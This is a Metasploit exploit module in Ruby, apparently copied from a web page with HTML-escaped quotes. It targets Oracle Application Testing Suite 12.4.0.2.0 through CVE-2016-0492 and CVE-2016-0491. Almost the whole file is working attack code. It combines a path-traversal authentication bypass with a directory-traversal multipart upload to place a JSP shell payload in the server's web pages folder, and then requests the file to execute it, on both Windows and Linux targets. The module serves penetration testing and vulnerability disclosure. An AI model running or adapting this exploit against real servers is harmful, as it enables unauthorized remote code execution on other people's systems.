# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
 
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Oracle ATS Arbitrary File Upload&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an authentication bypass and arbitrary file upload
        in Oracle Application Testing Suite (OATS), version 12.4.0.2.0 and
        unknown earlier versions, to upload and execute a JSP shell.
      },
      &#039;Author&#039;         => [
        &#039;Zhou Yu&#039;, # Proof of concept
        &#039;wvu&#039;      # Metasploit module
      ],
      &#039;References&#039;     => [
        %w{CVE 2016-0492}, # Auth bypass
        %w{CVE 2016-0491}, # File upload
        %w{EDB 39691}      # PoC
      ],
      &#039;DisclosureDate&#039; => &#039;Jan 20 2016&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => %w{win linux},
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [&#039;OATS <= 12.4.0.2.0 (Windows)&#039;, &#039;Platform&#039; => &#039;win&#039;],
        [&#039;OATS <= 12.4.0.2.0 (Linux)&#039;,   &#039;Platform&#039; => &#039;linux&#039;]
      ],
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options([
      Opt::RPORT(8088)
    ])
  end
 
  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/admin/Login.do&#039;
    )
 
    if res && res.body.include?(&#039;12.4.0.2.0&#039;)
      CheckCode::Appears
    else
      CheckCode::Safe
    end
  end
 
  def exploit
    print_status("Uploading JSP shell to #{jsp_path}")
    upload_jsp_shell
    print_status("Executing JSP shell: #{full_uri}olt/pages/#{jsp_filename}")
    exec_jsp_shell
  end
 
  def upload_jsp_shell
    mime = Rex::MIME::Message.new
    mime.add_part(&#039;.jsp&#039;, nil, nil, &#039;form-data; name="storage.extension"&#039;)
    mime.add_part(jsp_filename, nil, nil, &#039;form-data; name="fileName1"&#039;)
    mime.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="fileName2"&#039;) # Not needed
    mime.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="fileName3"&#039;) # Not needed
    mime.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="fileName4"&#039;) # Not needed
    mime.add_part(&#039;*&#039;, nil, nil, &#039;form-data; name="fileType"&#039;)
    mime.add_part(payload.encoded, &#039;text/plain&#039;, nil,
                  %Q{form-data; name="file1"; filename="#{jsp_filename}"})
    mime.add_part(&#039;Default&#039;, nil, nil, &#039;form-data; name="storage.repository"&#039;)
    mime.add_part(&#039;.&#039;, nil, nil, &#039;form-data; name="storage.workspace"&#039;)
    mime.add_part(jsp_directory, nil, nil, &#039;form-data; name="directory"&#039;)
 
    register_files_for_cleanup(jsp_path)
 
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => &#039;/olt/Login.do/../../olt/UploadFileUpload.do&#039;,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{mime.bound}",
      &#039;data&#039;   => mime.to_s
    )
  end
 
  def exec_jsp_shell
    send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "/olt/pages/#{jsp_filename}"
    )
  end
 
  def jsp_directory
    case target[&#039;Platform&#039;]
    when &#039;win&#039;
      &#039;..\\oats\\servers\\AdminServer\\tmp\\_WL_user\\oats_ee\\1ryhnd\\war\\pages&#039;
    when &#039;linux&#039;
      &#039;../oats/servers/AdminServer/tmp/_WL_user/oats_ee/1ryhnd/war/pages&#039;
    end
  end
 
  def jsp_filename
    @jsp_filename ||= Rex::Text.rand_text_alpha(8) + &#039;.jsp&#039;
  end
 
  def jsp_path
    jsp_directory + "#{target[&#039;Platform&#039;] == &#039;win&#039; ? &#039;\\&#039; : &#039;/&#039;}" + jsp_filename
  end
 
end

